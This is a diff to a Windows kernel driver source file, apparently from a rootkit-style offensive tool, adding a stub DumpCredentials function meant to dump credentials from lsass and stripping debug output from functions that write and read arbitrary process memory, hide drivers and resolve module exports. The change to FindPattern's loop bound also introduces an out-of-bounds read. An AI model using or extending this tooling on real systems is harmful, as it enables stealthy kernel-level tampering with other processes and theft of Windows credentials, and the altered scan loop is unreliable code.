@@ -581,6 +581,22 @@ NTSTATUS MemoryUtils::UnhideDriver(HiddenDriverInformation* DriverInformation) {
 
 /*
 * Description:
+* DumpCredentials is responsible for dumping credentials from lsass.
+*
+* Parameters:
+* @LsassInformation [LsassInformation*] -- Output information to decrypt credentials.
+*
+* Returns:
+* @status			[NTSTATUS]			-- Whether successfuly dumped or not.
+*/
+NTSTATUS DumpCredentials(LsassInformation* LsassInformation) {
+	NTSTATUS status = STATUS_SUCCESS;
+
+	return status;
+}
+
+/*
+* Description:
 * KeWriteProcessMemory is responsible for writing data to any target process.
 *
 * Parameters:
@@ -600,20 +616,16 @@ NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS Ta
 	SIZE_T bytesWritten;
 	NTSTATUS status = STATUS_SUCCESS;
 
-	if (mode != KernelMode && mode != UserMode) {
-		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
+	if (mode != KernelMode && mode != UserMode)
 		return STATUS_UNSUCCESSFUL;
-	}
 
 	// Making sure that the given kernel mode address is valid.
 	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
 		status = STATUS_UNSUCCESSFUL;
-		KdPrint((DRIVER_PREFIX "Invalid kernel source address or target address.\n"));
 		return status;
 	}
 	else if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
 		status = STATUS_UNSUCCESSFUL;
-		KdPrint((DRIVER_PREFIX "Invalid user mode source address or target address.\n"));
 		return status;
 	}
 
@@ -621,7 +633,6 @@ NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS Ta
 	status = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "Failed to get process to handle.\n"));
 		return status;
 	}
 
@@ -630,7 +641,6 @@ NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS Ta
 	status = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "Failed to change protection, (0x%08X).\n", status));
 		ZwClose(hTargetProcess);
 		return status;
 	}
@@ -638,9 +648,6 @@ NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS Ta
 
 	// Writing the data.
 	status = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);
-
-	if (!NT_SUCCESS(status))
-		KdPrint((DRIVER_PREFIX "MmCopyVirtualMemory failed status, (0x%08X).\n", status));
 
 	// Restoring permissions and cleaning up.
 	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess) == STATUS_SUCCESS) {
@@ -669,20 +676,14 @@ NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS Ta
 NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
 	SIZE_T bytesRead;
 
-	if (mode != KernelMode && mode != UserMode) {
-		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
+	if (mode != KernelMode && mode != UserMode)
 		return STATUS_UNSUCCESSFUL;
-	}
 
 	// Making sure that the given kernel mode address is valid.
-	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress)) {
-		KdPrint((DRIVER_PREFIX "Invalid kernel target address.\n"));
+	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress))
 		return STATUS_UNSUCCESSFUL;
-	}
-	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress)) {
-		KdPrint((DRIVER_PREFIX "Invalid user mode target address.\n"));
+	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress))
 		return STATUS_UNSUCCESSFUL;
-	}
 
 	return MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
 }
@@ -837,19 +838,15 @@ PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 
 	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(Process);
 
-	if (!targetPeb) {
-		KdPrint((DRIVER_PREFIX "Failed to get PEB.\n"));
+	if (!targetPeb)
 		return moduleBase;
-	}
 
 	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
 		KeDelayExecutionThread(KernelMode, FALSE, &time);
 	}
 
-	if (!targetPeb->LoaderData) {
-		KdPrint((DRIVER_PREFIX "Failed to get LDR.\n"));
+	if (!targetPeb->LoaderData)
 		return moduleBase;
-	}
 
 	// Getting the module's image base.
 	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
@@ -888,24 +885,18 @@ PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 		return functionAddress;
 
 	// Checking that the image is valid PE file.
-	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		KdPrint((DRIVER_PREFIX "DOS signature isn't valid.\n"));
+	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
 		return functionAddress;
-	}
 
 	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)moduleBase + dosHeader->e_lfanew);
 
-	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
-		KdPrint((DRIVER_PREFIX "NT signature isn't valid.\n"));
+	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
 		return functionAddress;
-	}
 
 	IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;
 
-	if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
-		KdPrint((DRIVER_PREFIX "There are no exports.\n"));
+	if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
 		return functionAddress;
-	}
 
 	// Iterating the export directory.
 	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
@@ -1117,7 +1108,7 @@ PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, c
 	if (pattern == NULL || base == NULL || len == 0 || size == 0)
 		return NULL;
 
-	for (ULONG i = 0; i < size - len; i++) {
+	for (ULONG i = 0; i < size; i++) {
 		found = true;
 
 		for (ULONG j = 0; j < len; j++) {
